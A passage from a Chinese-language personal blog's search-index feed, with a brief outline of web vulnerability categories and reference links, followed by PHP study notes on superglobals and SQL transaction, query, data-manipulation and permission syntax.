href="#WEB数据库层面的漏洞" class="headerlink" title="WEB数据库层面的漏洞"></a>WEB数据库层面的漏洞</h2><ol><li>内核漏洞–分系统的</li></ol><h2 id="WEB系统层面的漏洞"><a href="#WEB系统层面的漏洞" class="headerlink" title="WEB系统层面的漏洞"></a>WEB系统层面的漏洞</h2><ol><li>提权漏洞，源代码漏洞</li><li>文件包含/上传漏洞</li><li>命令注入漏洞</li><li>缓冲区溢出漏洞等</li></ol><h2 id="第三方软件层面的漏洞"><a href="#第三方软件层面的漏洞" class="headerlink" title="第三方软件层面的漏洞"></a>第三方软件层面的漏洞</h2><p>(1) 电脑上的第三方软件</p><h2 id="APP或PC应用层面的漏洞"><a href="#APP或PC应用层面的漏洞" class="headerlink" title="APP或PC应用层面的漏洞"></a>APP或PC应用层面的漏洞</h2><p>(1) 网站越简洁，漏洞越少；功能越多，出现漏洞的几率越大。</p><p>(2) 客户端是另外一种网站，可能涉及逆向破解等。</p><p>(3) APP套壳封装为网站，核心就是网站。</p><p>(4) 可以从APP中剖析出各种各样的网站层面的Web协议，分析出APP涉及的网站信息，再转到网站进行安全测试（可以还原为Web页面）。<br>如果无法还原，则需要进行逆向工程等操作。</p><h1 id="参考及资料"><a href="#参考及资料" class="headerlink" title="参考及资料"></a>参考及资料</h1><p><a href="https://cloud.tencent.com/developer/article/1594781">常见的Web源码泄漏漏洞及其利用</a><br><a href="https://blog.csdn.net/bylfsj/article/details/102683791">web中间件常见漏洞</a><br><a href="https://www.cnblogs.com/1-Ry/p/15547701.html">初探免杀之路——免杀方法测试</a></p><p><a href="https://www.cnblogs.com/yzloo/p/10391078.html">常见十大漏洞</a><br><a href="https://owasp.org/Top10/">OWASP Top 10</a>–每4年更新一次<br><a href="https://zhuanlan.zhihu.com/p/363764954">理解Linux内核漏洞</a><br><a href="https://blog.csdn.net/weixin_46694260/article/details/121707869?ops_request_misc=&request_id=&biz_id=102&utm_term=%20%E5%8D%81%E5%A4%A7%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-121707869.142%5Ev73%5Epc_search_v2,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">OWASP top 10漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-014(放缓)</title>
      <link href="/2023/03/07/PHP-Study-014/"/>
      <url>/2023/03/07/PHP-Study-014/</url>
      
        <content type="html"><![CDATA[<h1 id="预定义变量概述"><a href="#预定义变量概述" class="headerlink" title="预定义变量概述"></a>预定义变量概述</h1><span id="more"></span><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt; <span class="variable">$GLOBALS</span>：          超全局变量数组，保存全局变量。-- 作用的范围仅仅当前文件。</span><br><span class="line">                        -- 定义方式：</span><br><span class="line">                            <span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>]=<span class="number">100</span> <span class="comment">// 定义全局变量$x的值为100</span></span><br><span class="line">&gt; <span class="variable">$_SERVER</span>：          服务器和执行环境信息的数组。</span><br><span class="line">&gt; <span class="variable">$_GET</span>：GET          请求信息的数组。</span><br><span class="line">&gt; <span class="variable">$_POST</span>：POST        请求信息的数组。</span><br><span class="line">&gt; <span class="variable">$_FILES</span>：           文件上传信息的数组。</span><br><span class="line">&gt; <span class="variable">$_COOKIE</span>：Cookie    信息的数组。</span><br><span class="line">&gt; <span class="variable">$_SESSION</span>：Session  变量的数组。</span><br><span class="line">&gt; <span class="variable">$_REQUEST</span>：包含 <span class="variable">$_GET</span>、<span class="variable">$_POST</span> 和 <span class="variable">$_COOKIE</span> 的数组。</span><br><span class="line">&gt; <span class="variable">$_ENV</span>：             环境变量的数组。</span><br></pre></td></tr></table></figure><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><p>下面仅罗列，具体情况遇到了再说。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>是一个包含了诸多服务器和执行环境信息的预定义变量，以下是它的一些常见参数及其含义：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]：           客户端所请求的主机名或IP地址</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]：     浏览器的用户代理字符串</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>]：         浏览器接受的请求头部的MIME类型</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]：浏览器接受的语言类型</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_ENCODING&#x27;</span>]：浏览器接受的编码类型</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CONNECTION&#x27;</span>]：     浏览器请求使用的连接类型</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>]：       当前执行脚本所在的文档根目录</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]：        当前页面的来源地址</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]：            当前执行脚本的文件名</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_COOKIE&#x27;</span>]：         当前页面的cookie信息</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>]：判断当前请求是否为Ajax请求</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_PORT&#x27;</span>]：         客户端连接端口号</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]：         客户端IP地址</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]：         服务器IP地址</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>]：         服务器名称</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>]：     请求协议的名称和版本</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>]：     服务器软件名称和版本</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]：         请求的URI</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]：      请求的方法（GET、POST等）</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]：        查询字符串</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]：     当前执行脚本的绝对路径</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]：         当前执行脚本的路径</span><br><span class="line"></span><br><span class="line">这些参数可用于获取当前请求的各种信息，帮助我们进行一些特定的操作，例如获取请求的方法，判断请求是否为Ajax请求，获取当前页面的来源地址等。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-013-数据库-03</title>
      <link href="/2023/03/05/PHP-Study-013/"/>
      <url>/2023/03/05/PHP-Study-013/</url>
      
        <content type="html"><![CDATA[<p>TCL(会话控制)</p><span id="more"></span><h1 id="TCL"><a href="#TCL" class="headerlink" title="TCL"></a>TCL</h1><p>TCL (Transaction Control Language) 是用于控制事务的语言，包括提交 (commit)、回滚 (rollback) 和保存点 (savepoint)。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COMMIT</span>：            将所有的事务更改永久保存到数据库中，结束当前事务。</span><br><span class="line"><span class="keyword">ROLLBACK</span>：          撤销当前事务的所有更改，回滚到事务开始之前的状态。</span><br><span class="line"><span class="keyword">SAVEPOINT</span>：         为当前事务创建一个保存点，可以在事务执行过程中使用 <span class="keyword">ROLLBACK</span> 回滚到指定的保存点。</span><br><span class="line"><span class="keyword">RELEASE</span> <span class="keyword">SAVEPOINT</span>： 删除事务中指定的保存点，释放相关的数据库资源。</span><br><span class="line"><span class="keyword">SET</span> TRANSACTION：   设置事务的隔离级别和事务的读写特性。</span><br></pre></td></tr></table></figure><p>TCL一般与DML语句配合使用。</p><p>事务：一个事务是一组SQL语句。</p><p>“事务”格式如下:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 开始一个事务</span></span><br><span class="line"><span class="keyword">BEGIN</span> TRANSACTION;</span><br><span class="line"><span class="comment">-- SQL 语句块</span></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"><span class="comment">-- 提交事务</span></span><br></pre></td></tr></table></figure><h2 id="COMMIT-提交"><a href="#COMMIT-提交" class="headerlink" title="COMMIT(提交)"></a>COMMIT(提交)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 将当前事务做出的更改提交并保存到数据库，释放锁定的资源。 </span></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 特殊情况(不是所有的数据库都支持)</span></span><br><span class="line">    <span class="keyword">COMMIT</span> WORK：           默认选项，表示提交当前事务并释放锁定资源。与基本的<span class="keyword">COMMIT</span>语句相同。</span><br><span class="line">    <span class="keyword">COMMIT</span> TRANSACTION：    与<span class="keyword">COMMIT</span> WORK相同，也是默认选项。表示提交当前事务并释放锁定资源。</span><br><span class="line"></span><br><span class="line">    <span class="keyword">COMMIT</span> <span class="keyword">AND</span> CHAIN：      提交当前事务并立即启动一个新的事务，使新的事务成为当前事务。</span><br><span class="line">    <span class="keyword">COMMIT</span> <span class="keyword">AND</span> <span class="keyword">NO</span> CHAIN：   提交当前事务并不立即启动一个新的事务。这是默认选项。</span><br><span class="line">    <span class="keyword">COMMIT</span> RETAIN LOCKS：   提交当前事务，但保留当前事务所获取的所有锁定资源。 </span><br></pre></td></tr></table></figure><h2 id="ROLLBACK-撤销与回滚"><a href="#ROLLBACK-撤销与回滚" class="headerlink" title="ROLLBACK(撤销与回滚)"></a>ROLLBACK(撤销与回滚)</h2><p>用于撤销未提交的事务或回滚已经提交的事务。<br>注： <strong>COMMIT</strong> 后不能被撤销操作修改，也就是撤销不了已经提交保存到数据的修改。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1.撤销未提交的事务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 事务开始</span></span><br><span class="line"><span class="keyword">BEGIN</span> TRANSACTION;</span><br><span class="line"><span class="comment">-- 做一些修改</span></span><br><span class="line"><span class="keyword">ROLLBACK</span>; <span class="comment">-- 撤销所有的修改至事务开始</span></span><br><span class="line"><span class="comment">-- (等于你啥都没写，啥都没修改)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2.回滚到指定的保存点</span></span><br><span class="line"><span class="keyword">BEGIN</span> TRANSACTION;</span><br><span class="line"><span class="comment">-- 做一些修改</span></span><br><span class="line"><span class="keyword">SAVEPOINT</span> my_savepoint;</span><br><span class="line"><span class="comment">-- 做一些其他的修改</span></span><br><span class="line"><span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> <span class="keyword">SAVEPOINT</span> my_savepoint; <span class="comment">-- 将当前事务回滚到保存点my_savepoint</span></span><br><span class="line"><span class="comment">-- 未COMMIT的所有操作都会被取消，并且回到最初的状态。</span></span><br><span class="line"><span class="comment">-- 也就是说，回滚到保存点后，在保存点后新的操作都将被撤销。</span></span><br></pre></td></tr></table></figure><h2 id="SAVEPOINT-保存点"><a href="#SAVEPOINT-保存点" class="headerlink" title="SAVEPOINT(保存点)"></a>SAVEPOINT(保存点)</h2><p>用于创建一个保存点。上面在撤销时可以直接撤销到保存点而不是撤销整个修改的操作。<br>注：当整个事务COMMIT后，所有的 <strong>SAVEPOINT</strong> 都会失效！(不能回滚的原因)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 语法</span></span><br><span class="line"><span class="keyword">SAVEPOINT</span> savepoint_name;</span><br></pre></td></tr></table></figure><h2 id="RELEASE-SAVEPOINT-删保存节点"><a href="#RELEASE-SAVEPOINT-删保存节点" class="headerlink" title="RELEASE SAVEPOINT(删保存节点)"></a>RELEASE SAVEPOINT(删保存节点)</h2><p>如果指定的保存点名称存在，则该命令将删除保存点，并释放由保存点所占用的所有相关资源。<br>如果指定的保存点名称不存在就报错。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RELEASE</span> <span class="keyword">SAVEPOINT</span> savepoint_name;</span><br></pre></td></tr></table></figure><h2 id="SET-TRANSACTION-隔离级别"><a href="#SET-TRANSACTION-隔离级别" class="headerlink" title="SET TRANSACTION(隔离级别)"></a>SET TRANSACTION(隔离级别)</h2><p>用于设置事务的隔离级别和其他选项。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ISOLATION LEVEL：用于设置事务的隔离级别。</span><br><span class="line">        READ UNCOMMITTED    读未提交</span><br><span class="line">        READ COMMITTED      已提交读</span><br><span class="line">        REPEATABLE READ     可重复读取</span><br><span class="line">        SERIALIZABLE        可序列化</span><br><span class="line">        </span><br><span class="line">        默认的隔离级别是数据库的默认隔离级别。</span><br><span class="line"></span><br><span class="line">        <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> </span><br><span class="line">            在 MySQL 中，默认隔离级别是 Repeatable Read（可重复读）；</span><br><span class="line">            在 PostgreSQL 中，默认隔离级别是 Read Committed（已提交读）；</span><br><span class="line">            在 Oracle 中，默认隔离级别是 Read Committed（已提交读）</span><br><span class="line">eg：</span><br><span class="line"><span class="comment">-- 设置隔离级别为 READ COMMITTED，读写性质为 READ WRITE：</span></span><br><span class="line"><span class="keyword">SET</span> TRANSACTION ISOLATION LEVEL READ COMMITTED READ WRITE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">READ <span class="keyword">ONLY</span> <span class="operator">/</span> READ WRITE：用于设置事务的读写性质。</span><br><span class="line">    READ <span class="keyword">ONLY</span>    则事务只能进行读取操作；</span><br><span class="line">    READ WRITE   则事务可以进行读取和写入操作(默认)。</span><br><span class="line">eg:</span><br><span class="line"><span class="comment">-- 设置事务为只读，不可延迟：</span></span><br><span class="line"><span class="keyword">SET</span> TRANSACTION READ <span class="keyword">ONLY</span> <span class="keyword">NOT</span> DEFERRABLE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DEFERRABLE <span class="operator">/</span> <span class="keyword">NOT</span> DEFERRABLE：用于设置事务的延迟性质。</span><br><span class="line">    DEFERRABLE      事务可以延迟提交，直到其他事务完成。</span><br><span class="line">    <span class="keyword">NOT</span> DEFERRABLE  事务必须立即提交(默认)。</span><br><span class="line">eg:</span><br><span class="line"><span class="comment">-- 设置事务为可读可写，可延迟：</span></span><br><span class="line"><span class="keyword">SET</span> TRANSACTION READ WRITE DEFERRABLE;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-012-数据库-02</title>
      <link href="/2023/03/04/PHP-Study-012/"/>
      <url>/2023/03/04/PHP-Study-012/</url>
      
        <content type="html"><![CDATA[<p>DML，DML，DCL<br>为了放置关键字和参数混淆，所有的关键字均采用大写，参数采用小写。</p><span id="more"></span><h1 id="DQL-数据查询语言"><a href="#DQL-数据查询语言" class="headerlink" title="DQL(数据查询语言)"></a>DQL(数据查询语言)</h1><p>最简单的查询语言就一句：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询所有字段的数据</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure><p>下面是与DQL的所有参数：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 各个参数的说明</span></span><br><span class="line">    <span class="keyword">SELECT</span>：指定要查询的列名或表达式，可以用逗号分隔多个列，也可以使用通配符<span class="operator">*</span>选择所有列。</span><br><span class="line">    <span class="keyword">FROM</span>：指定要从中查询数据的表名。</span><br><span class="line">    <span class="keyword">WHERE</span>：指定一个条件表达式，用于筛选数据。</span><br><span class="line"></span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span>：按一个或多个列对查询结果进行分组，通常与聚合函数一起使用。</span><br><span class="line">        聚合函数使用时使用，可以用于指定列进行分组计算聚合函数的值。</span><br><span class="line">        简单举个例子：</span><br><span class="line">        <span class="comment">--------</span></span><br><span class="line">        id  number</span><br><span class="line">        <span class="number">1</span>   <span class="number">1</span></span><br><span class="line">        <span class="number">1</span>   <span class="number">11</span></span><br><span class="line">        <span class="number">2</span>   <span class="number">2</span></span><br><span class="line">        <span class="number">3</span>   <span class="number">3</span></span><br><span class="line">        <span class="number">3</span>   <span class="number">13</span></span><br><span class="line">        <span class="number">4</span>   <span class="number">4</span></span><br><span class="line">        <span class="number">4</span>   <span class="number">14</span></span><br><span class="line">        <span class="comment">---------</span></span><br><span class="line">        <span class="comment">-- sum：求和函数</span></span><br><span class="line">        <span class="comment">-- 筛选id字段(具体为每个id不重复，相同值的id将会作为&#x27;数字之和&#x27;的累加目标)</span></span><br><span class="line">        <span class="keyword">select</span> id,<span class="built_in">sum</span>(number) <span class="keyword">as</span> 数字之和 <span class="keyword">from</span> table_name <span class="keyword">group</span> <span class="keyword">by</span> id;</span><br><span class="line">        <span class="comment">-- 结果如下：</span></span><br><span class="line">        id  number</span><br><span class="line">        <span class="number">1</span>   <span class="number">12</span></span><br><span class="line">        <span class="number">2</span>   <span class="number">2</span></span><br><span class="line">        <span class="number">3</span>   <span class="number">16</span></span><br><span class="line">        <span class="number">4</span>   <span class="number">18</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">HAVING</span>：对<span class="keyword">GROUP</span> <span class="keyword">BY</span>的结果进行筛选，通常与聚合函数一起使用。</span><br><span class="line">        差不多是： </span><br><span class="line">        <span class="comment">-- 查表sales的字段id列数据和number列的数值和，且以id为筛选条件，过滤掉id大于3的所有参数。</span></span><br><span class="line">        <span class="keyword">SELECT</span> id,<span class="built_in">sum</span>(number) <span class="keyword">FROM</span> sales <span class="keyword">GROUP</span> <span class="keyword">BY</span> id <span class="keyword">HAVING</span> id<span class="operator">&gt;</span><span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ORDER</span> <span class="keyword">BY</span>：按一个或多个列对查询结果进行排序，可以指定升序或降序排序。</span><br><span class="line">        <span class="comment">-- 排序的就是了。</span></span><br><span class="line">        <span class="keyword">ASC</span>表示升序排列(默认)</span><br><span class="line">        <span class="keyword">DESC</span>表示降序排列</span><br><span class="line"></span><br><span class="line">    LIMIT：限制查询结果的行数。</span><br><span class="line">        限制范围：[number_of_rows,<span class="keyword">offset</span>]</span><br><span class="line">        LIMIT number_of_rows <span class="keyword">OFFSET</span> <span class="keyword">offset</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">OFFSET</span>：指定查询结果的偏移量，用于分页查询。</span><br><span class="line">    <span class="keyword">DISTINCT</span>：指定查询结果中不包含重复的行。</span><br><span class="line">    <span class="keyword">JOIN</span>：连接多个表以获取更复杂的查询结果。</span><br><span class="line">    <span class="keyword">UNION</span>：将两个或多个<span class="keyword">SELECT</span>语句的结果组合成一个结果集。</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">GROUPING</span> SETS：按多个维度对查询结果进行分组。</span><br><span class="line">    <span class="keyword">CUBE</span>：按所有可能的维度对查询结果进行分组。</span><br><span class="line">    <span class="keyword">ROLLUP</span>：按层次结构对查询结果进行分组。</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">AS</span>：指定列或表达式的别名。</span><br><span class="line">    COUNT：计算行数或非<span class="keyword">NULL</span>值的数量。</span><br><span class="line">    SUM：计算列的总和。</span><br><span class="line">    AVG：计算列的平均值。</span><br><span class="line">    MIN：计算列的最小值。</span><br><span class="line">    MAX：计算列的最大值。</span><br><span class="line">    <span class="keyword">EXISTS</span>：检查子查询是否返回任何行。</span><br><span class="line">    <span class="keyword">IN</span>：指定一个条件范围，将其与子查询或列表一起使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 结构如下(具体需要时再细查)</span></span><br><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> column1, column2, ...</span><br><span class="line"><span class="keyword">HAVING</span> <span class="keyword">condition</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> column1 <span class="keyword">ASC</span><span class="operator">/</span><span class="keyword">DESC</span>, column2 <span class="keyword">ASC</span><span class="operator">/</span><span class="keyword">DESC</span>, ...</span><br><span class="line">LIMIT number_of_rows <span class="keyword">OFFSET</span> offset_value;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="DML-数据操作语言"><a href="#DML-数据操作语言" class="headerlink" title="DML(数据操作语言)"></a>DML(数据操作语言)</h1><h2 id="insert插入语句"><a href="#insert插入语句" class="headerlink" title="insert插入语句"></a>insert插入语句</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 将VALUES的值(value1,value2,value3...)对应的插入到table_name表的对应字段(column1,column2,column3...)当中。</span></span><br><span class="line"><span class="comment">-- 注意：</span></span><br><span class="line"><span class="comment">--  插入值的时候，要时刻注意字段名和值是一一对应的关系。</span></span><br><span class="line"><span class="comment">--  插入的字段名，可以自己调整</span></span><br><span class="line"><span class="comment">--  插入的字段名可以不存在，但值必须与表中的字段名一一对应。</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1,column2,column3...) <span class="keyword">VALUES</span> (value1,value2,value3...); </span><br><span class="line"><span class="comment">-- 下面是示范</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sec_table (name,age,height)<span class="keyword">VALUES</span>(syw_sec,<span class="number">18</span>,<span class="number">170</span>);</span><br></pre></td></tr></table></figure><h2 id="UPDATE更新语句"><a href="#UPDATE更新语句" class="headerlink" title="UPDATE更新语句"></a>UPDATE更新语句</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> column1<span class="operator">=</span>value1,column2<span class="operator">=</span>column2,... <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br><span class="line"><span class="comment">-- table_name      表名</span></span><br><span class="line"><span class="comment">-- column=value    将字段column对应的值更新为value</span></span><br><span class="line"><span class="comment">-- condition       条件控制，可以使前面的更改精确到某一行。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 举个例子</span></span><br><span class="line"><span class="comment">-- 将id为2的那一行对应的sex字段的值更新为‘man’</span></span><br><span class="line"><span class="keyword">UPDATE</span> sec_table <span class="keyword">SET</span> sex<span class="operator">=</span><span class="string">&#x27;man&#x27;</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="DELETE删除语句"><a href="#DELETE删除语句" class="headerlink" title="DELETE删除语句"></a>DELETE删除语句</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 删除table_name表下对应condition条件的数据</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br><span class="line"><span class="comment">-- 举例：删除sec表的id为3的那一行的数据</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> sec <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">3</span>;</span><br></pre></td></tr></table></figure><h1 id="DCL-数据控制语言"><a href="#DCL-数据控制语言" class="headerlink" title="DCL(数据控制语言)"></a>DCL(数据控制语言)</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span>：         授权，允许用户执行特定的操作；</span><br><span class="line"><span class="keyword">REVOKE</span>：        撤销权限，取消已有的权限；</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span>：   创建用户，为数据库添加新的用户账户；</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span>：     删除用户，删除不再需要的用户账户；</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span>：    修改用户属性，如密码等；</span><br><span class="line"><span class="keyword">CREATE</span> ROLE：   创建角色，为一组用户分配相同的权限；</span><br><span class="line"><span class="keyword">DROP</span> ROLE：     删除角色，删除不再需要的角色；</span><br><span class="line"><span class="keyword">ALTER</span> ROLE：    修改角色属性，如权限等；</span><br><span class="line"><span class="keyword">GRANT</span> ROLE：    将角色授予用户，赋予用户相应的权限；</span><br><span class="line"><span class="keyword">REVOKE</span> ROLE：   将角色撤销，取消用户相应的权限。</span><br></pre></td></tr></table></figure><h2 id="GRANT授权于REVOKE撤权"><a href="#GRANT授权于REVOKE撤权" class="headerlink" title="GRANT授权于REVOKE撤权"></a>GRANT授权于REVOKE撤权</h2><p>授权语句，用于授权用户或角色对某个对象（如表、视图等）进行特定操作的权限。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> permission <span class="keyword">ON</span> object <span class="keyword">TO</span> <span class="operator">&lt;</span><span class="keyword">user</span> <span class="keyword">or</span> role<span class="operator">&gt;</span>; </span><br><span class="line"><span class="keyword">REVOKE</span> privilege_name [, privilege_name ...] <span class="keyword">ON</span> object <span class="keyword">FROM</span> &#123;user_name <span class="operator">|</span> PUBLIC <span class="operator">|</span> role_name&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- permission常见的参数如下：</span></span><br><span class="line"><span class="keyword">SELECT</span>：允许用户查询指定表中的数据。</span><br><span class="line"><span class="keyword">INSERT</span>：允许用户向指定表中插入数据。</span><br><span class="line"><span class="keyword">UPDATE</span>：允许用户更新指定表中的数据。</span><br><span class="line"><span class="keyword">DELETE</span>：允许用户删除指定表中的数据。</span><br><span class="line"><span class="keyword">EXECUTE</span>：授予对存储过程、函数等程序对象的执行权限。</span><br><span class="line"><span class="keyword">REFERENCES</span>：授予对外键列的<span class="keyword">REFERENCES</span>权限，允许用户在表之间建立关系。</span><br><span class="line"><span class="keyword">ALL</span> PRIVILEGES：允许用户对指定对象执行所有操作。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">ON</span>：指定对象名称。</span><br><span class="line"><span class="comment">-- object：数据库对象</span></span><br><span class="line"><span class="keyword">TO</span>：指定被授权的用户或角色名称</span><br><span class="line"><span class="comment">-- user or role：被授权的用户或者组，这里提一嘴，可以给&quot;角色&quot;授予权限。</span></span><br><span class="line"><span class="comment">-- PUBLIC：所有用户的意思</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 举个例子</span></span><br><span class="line"><span class="comment">-- 给用户Jack授予可以在sec_table表中select的权限。</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> sec_table <span class="keyword">TO</span> Jack;</span><br></pre></td></tr></table></figure><h2 id="CREATE-USER和DROP-USER-创建与删除用户"><a href="#CREATE-USER和DROP-USER-创建与删除用户" class="headerlink" title="CREATE USER和DROP USER(创建与删除用户)"></a>CREATE USER和DROP USER(创建与删除用户)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建用户的操作</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> user_name [IDENTIFIED <span class="keyword">BY</span> password] [<span class="keyword">DEFAULT</span> TABLESPACE tablespace_name];</span><br><span class="line"><span class="comment">-- user_name                            创建的新的用户名 </span></span><br><span class="line"><span class="comment">-- [IDENTIFIED BY password]             设置用户密码(可选)，password为你的密码，形如&#x27;123456&#x27;.</span></span><br><span class="line"><span class="comment">-- [DEFAULT TABLESPACE tablespace_name] 将用户指向到默认的表空间tablespace_name</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除用户的操作</span></span><br><span class="line"><span class="comment">-- 可以一次删除多个用户。</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> username;</span><br></pre></td></tr></table></figure><p>这里其他内容有点多，暂且不提。</p><h2 id="ALTER-USER-修改用户信息"><a href="#ALTER-USER-修改用户信息" class="headerlink" title="ALTER USER(修改用户信息)"></a>ALTER USER(修改用户信息)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 下面所有的alter都是修改操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 关于下面提到的“角色”的解释：</span></span><br><span class="line"><span class="comment">-- 角色在数据库当中指的是一组权限的集合，可以授予用户。</span></span><br><span 